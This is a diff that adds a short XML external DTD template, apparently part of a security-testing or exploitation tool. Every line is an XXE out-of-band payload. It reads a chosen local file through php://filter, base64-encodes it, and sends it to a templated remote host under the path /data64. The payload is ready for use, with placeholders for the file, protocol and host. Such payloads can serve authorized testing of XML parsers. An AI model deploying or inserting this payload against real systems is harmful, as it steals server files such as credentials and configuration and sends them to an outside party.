@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file://{{fileName}}">
+<!ENTITY % all "<!ENTITY &#x25; send SYSTEM '{{protocol}}://{{hostName}}/data64?%file;'>">
+%all;
+%send;
